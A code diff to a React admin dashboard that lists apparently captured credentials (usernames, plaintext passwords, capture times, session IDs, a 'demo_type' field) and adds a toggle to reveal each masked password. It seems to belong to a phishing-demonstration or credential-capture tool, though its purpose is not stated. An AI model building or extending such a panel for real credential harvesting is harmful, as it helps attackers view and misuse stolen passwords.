@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { LogOut, RefreshCw, Trash2 } from 'lucide-react';
+import { Eye, EyeOff, LogOut, RefreshCw, Trash2 } from 'lucide-react';
 import { getApiUrl } from '../../api';
 
 export default function AdminDashboard() {
@@ -11,6 +11,7 @@ export default function AdminDashboard() {
   const [isLoading, setIsLoading] = useState(true);
   const [activeTab, setActiveTab] = useState('credentials');
   const [deleteConfirm, setDeleteConfirm] = useState(false);
+  const [revealedPasswords, setRevealedPasswords] = useState<Record<string, boolean>>({});
 
   useEffect(() => {
     const token = localStorage.getItem('adminToken');
@@ -77,6 +78,13 @@ export default function AdminDashboard() {
     } catch (error) {
       console.error('Delete failed:', error);
     }
+  };
+
+  const togglePasswordVisibility = (credentialId: string) => {
+    setRevealedPasswords((prev) => ({
+      ...prev,
+      [credentialId]: !prev[credentialId],
+    }));
   };
 
   if (isLoading && !credentials.length) {
@@ -171,23 +179,39 @@ export default function AdminDashboard() {
                     </tr>
                   </thead>
                   <tbody>
-                    {credentials.map((cred, idx) => (
-                      <tr key={idx} className="border-b hover:bg-gray-50">
-                        <td className="py-3 px-4 font-semibold">{cred.demo_type}</td>
-                        <td className="py-3 px-4">{cred.email_or_username}</td>
-                        <td className="py-3 px-4">
-                          <code className="bg-gray-200 px-2 py-1 rounded">
-                            {"•".repeat(Math.min(cred.password.length, 12))}
-                          </code>
-                        </td>
-                        <td className="py-3 px-4 text-xs text-gray-500">
-                          {new Date(cred.captured_at).toLocaleTimeString()}
-                        </td>
-                        <td className="py-3 px-4 text-xs text-gray-500">
-                          {cred.session_id?.slice(-8)}
-                        </td>
-                      </tr>
-                    ))}
+                    {credentials.map((cred, idx) => {
+                      const isPasswordVisible = !!revealedPasswords[cred.id];
+                      const passwordDisplay = isPasswordVisible
+                        ? cred.password
+                        : '•'.repeat(Math.min(String(cred.password || '').length, 12));
+
+                      return (
+                        <tr key={cred.id || idx} className="border-b hover:bg-gray-50">
+                          <td className="py-3 px-4 font-semibold">{cred.demo_type}</td>
+                          <td className="py-3 px-4">{cred.email_or_username}</td>
+                          <td className="py-3 px-4">
+                            <div className="flex items-center gap-2">
+                              <code className="bg-gray-200 px-2 py-1 rounded break-all">{passwordDisplay}</code>
+                              <button
+                                type="button"
+                                onClick={() => togglePasswordVisibility(cred.id)}
+                                className="p-1.5 rounded hover:bg-gray-200 transition"
+                                aria-label={isPasswordVisible ? 'Hide password' : 'Show password'}
+                                title={isPasswordVisible ? 'Hide password' : 'Show password'}
+                              >
+                                {isPasswordVisible ? <EyeOff size={16} /> : <Eye size={16} />}
+                              </button>
+                            </div>
+                          </td>
+                          <td className="py-3 px-4 text-xs text-gray-500">
+                            {new Date(cred.captured_at).toLocaleTimeString()}
+                          </td>
+                          <td className="py-3 px-4 text-xs text-gray-500">
+                            {cred.session_id?.slice(-8)}
+                          </td>
+                        </tr>
+                      );
+                    })}
                   </tbody>
                 </table>
                 {!credentials.length && (
